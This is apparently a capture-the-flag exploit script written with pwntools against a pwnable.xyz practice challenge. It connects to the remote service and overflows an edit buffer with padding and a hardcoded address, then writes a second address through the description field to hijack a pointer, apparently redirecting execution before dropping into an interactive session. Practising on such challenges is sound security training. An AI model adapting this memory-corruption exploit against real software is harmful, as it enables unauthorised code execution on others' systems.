#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30016)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('> ')
    io.sendline(str(idx))

def edit(l, c):
    menu(1)
    io.recvuntil("? ")
    io.sendline(str(l))
    io.recvuntil(": ")
    io.send(c)

def edit_desc(d):
    menu(2)
    io.recvuntil(": ")
    io.send(d)

edit(0x30, 'a' * 0x20 + p64(0x601268))
edit_desc(p64(0x40093c))
io.sendline('123')





io.interactive()
